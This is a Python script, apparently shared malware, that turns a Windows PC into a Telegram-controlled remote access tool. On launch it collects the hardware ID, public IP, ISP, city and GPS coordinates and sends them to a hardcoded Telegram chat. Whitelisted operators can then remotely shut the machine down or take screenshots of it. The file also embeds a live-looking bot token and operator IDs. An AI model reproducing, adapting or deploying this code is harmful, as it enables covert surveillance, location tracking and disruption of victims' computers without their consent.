import os
import telebot
import tempfile
import requests
import time
import subprocess
from PIL import ImageGrab
import datetime
from rgbprint import Color
import json





























#썃瞜㪠---------------------------------†Coded by 1C0unt†----------------------------------㪠瞜썃
token = '6110865060:AAEqfSvz-k-njA0EoTCEjSu9g8f52UbyvA0'                                 
whitelist = [5619490462, 6153348396]                                                                        # <<
hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
ip = requests.get('https://api.ipify.org/').text
os.system("py -m pip install pyTelegramBotAPI")
os.system("py -m pip install Pillow")
os.system("py -m pip install requests")
#썃瞜㪠---------------------------------†Coded by 1C0unt†----------------------------------㪠瞜썃
























os.system("title †Coded by 1C0unt† ")
os.system("cls")
y = (f"""{Color(0xff0000)}
                                      |             
                                   \       /        
                                     .---.           
                                '-.  |   |  .-'      
                                  ___|   |___        __  ___ __  _  _ __  _ _____  
                             -=  [           ]  =-  /  |/ _//  \| || |  \| |_   _| 
                                 `---.   .---'      `7 | \_| // | \/ | | ' | | |   
                              __||__ |   | __||__    |_|\__/\__/ \__/|_|\__| |_|   
                              '-..-' |   | '-..-'            †Coded by 1C0unt† 
                                ||   |   |   ||     
                                ||_.-|   |-,_||     
                              .-"`   `"`'`   `"-.   
                            .'                   '.
                            ┏▬▬▬▬▬▬▬▬ஜ۩۞۩ஜ▬▬▬▬▬▬▬┓ 
                            ┃    .:1C0unt#1010:.   ┃ 
                            ┃ ..:coded by 1C0unt:..┃ 
                            ┗▬▬▬▬▬▬▬▬ஜ۩۞۩ஜ▬▬▬▬▬▬▬┛ """)
print(y)


e = ("""
썃瞜㪠-------------------†Coded by 1C0unt†--------------------㪠瞜썃
commands
├─"i.sd"
│     └─"shutdown all active pc"
├─"i.ss"
│     └─"sends ss of all active pc"
├─"i.online"
│     └─"all online pc info"
썃瞜㪠-------------------†Coded by 1C0unt†--------------------㪠瞜썃
""")


a2 = "94.140.229.160"
mwa = "online: "
bot = telebot.TeleBot(token)
cutely = bot.message_handler(func=lambda message: message.chat.id in whitelist)

@bot.message_handler(func=lambda message: message.chat.id not in whitelist)
def checker(message):
    bot.send_message(message.chat.id, 'Access Denied')

if cutely:
    req = requests.request('get', f"http://free.ipwhois.io/json/", timeout=1.5).json()
    global inow
    inow = dict(req)
    ip = inow['ip']
    country = inow['country']
    isp = inow['isp']
    city = inow['city']
    latitude = inow['latitude']
    longitude = inow['longitude']
    timezone = inow['timezone_gmt']
    bot.send_message(6153348396, f"""new active pc:
hwid = {hwid}
ip = {ip}
country = {country}
isp = {isp}
city = {city}
latitude = {latitude}
longitude = {longitude}
timezone = {timezone}""")
    @bot.message_handler(commands=['start'])
    def send_welcome(message):
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("i.sd")
        markup.add("i.ss")
        markup.add("i.online")
        bot.send_message(message.chat.id, e, reply_markup=markup)

    @bot.message_handler(regexp='i.sd')
    def echo_message(message):
        bot.send_message(message.chat.id, 'shutdowning... coded by 1C0unt...')
        os.system("shutdown -s -t 0")

    @bot.message_handler(regexp='i.ss')
    def echo_message(message):
        path = tempfile.gettempdir() + 'screenshot.png'
        screenshot = ImageGrab.grab()
        screenshot.save(path, 'PNG')
        bot.send_photo(message.chat.id, open(path, 'rb'))

    @bot.message_handler(regexp='i.online')
    def echo_message(message):
        req = requests.request('get', f"http://free.ipwhois.io/json/", timeout=1.5).json()
        global inow
        inow = dict(req)
        ip = inow['ip']
        country = inow['country']
        isp = inow['isp']
        city = inow['city']
        latitude = inow['latitude']
        longitude = inow['longitude']
        timezone = inow['timezone_gmt']
        bot.send_message(message.chat.id, f"""online:
hwid = {hwid}
ip = {ip}
country = {country}
isp = {isp}
city = {city}
latitude = {latitude}
longitude = {longitude}
timezone = {timezone}""")
    @bot.message_handler(regexp='@ip')
    def echo_message(message):
        bot.send_message(message.chat.id, "ip found:" + "\n" + f"{ip}")


bot.infinity_polling()